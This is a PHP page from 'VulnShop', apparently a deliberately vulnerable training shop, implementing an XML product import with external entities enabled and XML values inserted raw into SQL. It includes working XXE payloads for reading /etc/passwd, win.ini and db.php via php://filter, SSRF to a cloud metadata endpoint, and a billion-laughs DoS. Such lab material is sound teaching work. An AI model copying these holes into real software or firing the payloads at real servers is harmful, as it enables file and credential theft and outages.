<?php
// ============================================================
//  VulnShop - XML Product Import
//  VULNERABILITIES:
//  - XXE (XML External Entity): libxml external entities enabled
//  - File read via XXE: <!ENTITY xxe SYSTEM "file:///etc/passwd">
//  - SSRF via XXE: <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
//  - Blind XXE via OOB: exfil data to attacker server
//  - Billion laughs DoS via entity expansion
// ============================================================
$page_title = 'XML Product Import';
require_once 'includes/header.php';

$result   = '';
$xml_echo = '';
$error    = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['xml_data'])) {
    $xml_data = $_POST['xml_data'];
    $xml_echo = $xml_data;

    // VULNERABILITY: external entities NOT disabled — XXE possible
    libxml_disable_entity_loader(false);   // explicitly re-enable (default vulnerable state)

    $dom = new DOMDocument();
    // VULNERABILITY: LIBXML_NOENT expands entities including external ones
    $loaded = @$dom->loadXML($xml_data, LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_DTDATTR);

    if (!$loaded) {
        $error = 'Invalid XML: ' . libxml_get_last_error()->message ?? 'Parse error';
    } else {
        $products_imported = [];
        $items = $dom->getElementsByTagName('product');

        if ($items->length === 0) {
            // Try to show parsed content anyway (reveals XXE output)
            $result = '<strong>Parsed XML content:</strong><br><pre style="background:#1e293b;color:#a5f3fc;padding:12px;border-radius:6px;overflow:auto">'
                    . htmlspecialchars($dom->saveXML())
                    . '</pre>';
        } else {
            foreach ($items as $item) {
                $name  = $item->getElementsByTagName('name')->item(0)?->nodeValue  ?? '';
                $price = $item->getElementsByTagName('price')->item(0)?->nodeValue ?? '';
                $desc  = $item->getElementsByTagName('desc')->item(0)?->nodeValue  ?? '';
                $stock = $item->getElementsByTagName('stock')->item(0)?->nodeValue ?? '0';

                if ($name) {
                    // VULNERABILITY: values from XML injected raw into DB
                    $cat_id = 1;
                    db_insert("INSERT INTO products (name, description, price, stock, category_id)
                               VALUES ('$name', '$desc', '$price', '$stock', $cat_id)");
                    $products_imported[] = $name;
                }
            }

            if (!empty($products_imported)) {
                $result = '<div class="alert alert-success">Imported ' . count($products_imported)
                        . ' product(s): <strong>' . implode(', ', array_map('htmlspecialchars', $products_imported)) . '</strong></div>';
            } else {
                $result = '<div class="alert alert-warning">No &lt;product&gt; elements found in XML.</div>';
            }
        }
    }
}

// Default XML template
$default_xml = '<?xml version="1.0" encoding="UTF-8"?>
<products>
    <product>
        <name>Test Widget</name>
        <price>19.99</price>
        <desc>A sample product</desc>
        <stock>50</stock>
    </product>
</products>';

$xxe_linux = '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<products>
    <product>
        <name>&xxe;</name>
        <price>1</price>
        <desc>XXE test</desc>
        <stock>1</stock>
    </product>
</products>';

$xxe_win = '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<products>
    <product>
        <name>&xxe;</name>
        <price>1</price>
        <desc>XXE Windows</desc>
        <stock>1</stock>
    </product>
</products>';

$xxe_ssrf = '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<products>
    <product>
        <name>&xxe;</name>
        <price>1</price>
        <desc>SSRF via XXE</desc>
        <stock>1</stock>
    </product>
</products>';

$xxe_php = '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=includes/db.php">
]>
<products>
    <product>
        <name>&xxe;</name>
        <price>1</price>
        <desc>PHP filter via XXE</desc>
        <stock>1</stock>
    </product>
</products>';

$xxe_billion = '<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<products><product><name>&lol4;</name><price>1</price><desc>DoS</desc><stock>1</stock></product></products>';
?>

<div class="page-title">
    <h1><i class="fas fa-file-code"></i> XML Product Import</h1>
    <span class="vuln-tag">XXE Injection</span>
</div>

<div class="lab-hint">
    <h4><i class="fas fa-flask"></i> Vulnerability: XML External Entity (XXE) Injection</h4>
    <table>
        <tr><th>Attack</th><th>Description</th></tr>
        <tr><td>File Read (Linux)</td><td>Read <code>/etc/passwd</code> via SYSTEM entity</td></tr>
        <tr><td>File Read (Windows)</td><td>Read <code>C:/Windows/win.ini</code></td></tr>
        <tr><td>PHP Filter</td><td>Base64-encode any PHP file and read it</td></tr>
        <tr><td>SSRF via XXE</td><td>Hit internal metadata endpoint (AWS/GCP/Azure)</td></tr>
        <tr><td>Billion Laughs</td><td>Entity expansion DoS attack</td></tr>
        <tr><td>Blind OOB XXE</td><td>Exfil data via DNS/HTTP to attacker server</td></tr>
    </table>
</div>

<!-- Payload buttons -->
<div style="display:flex;flex-wrap:wrap;gap:8px;margin-bottom:16px">
    <button class="btn btn-sm btn-outline" onclick="setXml('normal')">Normal Import</button>
    <button class="btn btn-sm btn-danger"  onclick="setXml('linux')">XXE /etc/passwd</button>
    <button class="btn btn-sm btn-danger"  onclick="setXml('win')">XXE win.ini</button>
    <button class="btn btn-sm btn-danger"  onclick="setXml('php')">XXE PHP Filter</button>
    <button class="btn btn-sm btn-warning" onclick="setXml('ssrf')">SSRF via XXE</button>
    <button class="btn btn-sm btn-warning" onclick="setXml('billion')">Billion Laughs DoS</button>
</div>

<div class="two-col-layout">
    <div class="checkout-section">
        <h3><i class="fas fa-upload"></i> XML Input</h3>
        <form method="POST">
            <div class="form-group">
                <label>XML Data <small style="color:#e74c3c">(external entities enabled — XXE!)</small></label>
                <textarea name="xml_data" id="xml_input" rows="18" class="form-control"
                          style="font-family:monospace;font-size:0.82rem"><?php echo htmlspecialchars($xml_echo ?: $default_xml); ?></textarea>
            </div>
            <button type="submit" class="btn btn-primary">
                <i class="fas fa-file-import"></i> Import XML
            </button>
        </form>
    </div>

    <div class="checkout-section">
        <h3><i class="fas fa-list-check"></i> Import Result</h3>
        <?php if ($error): ?>
            <div class="alert alert-danger"><?php echo htmlspecialchars($error); ?></div>
        <?php elseif ($result): ?>
            <?php echo $result; ?>
        <?php else: ?>
            <p style="color:#94a3b8;text-align:center;padding:30px 0">Submit XML to see results.</p>
        <?php endif; ?>

        <div style="margin-top:20px">
            <h4>How XXE Works</h4>
            <ol style="line-height:2;font-size:0.88rem;padding-left:20px;color:#64748b">
                <li>Define external entity in DOCTYPE</li>
                <li>Reference entity inside XML element</li>
                <li>Server expands entity — reads file / makes HTTP request</li>
                <li>Value returned in parsed XML / response</li>
            </ol>
        </div>
    </div>
</div>

<script>
const payloads = {
    normal:  <?php echo json_encode($default_xml); ?>,
    linux:   <?php echo json_encode($xxe_linux); ?>,
    win:     <?php echo json_encode($xxe_win); ?>,
    php:     <?php echo json_encode($xxe_php); ?>,
    ssrf:    <?php echo json_encode($xxe_ssrf); ?>,
    billion: <?php echo json_encode($xxe_billion); ?>
};
function setXml(key) {
    document.getElementById('xml_input').value = payloads[key];
}
</script>

<?php require_once 'includes/footer.php'; ?>
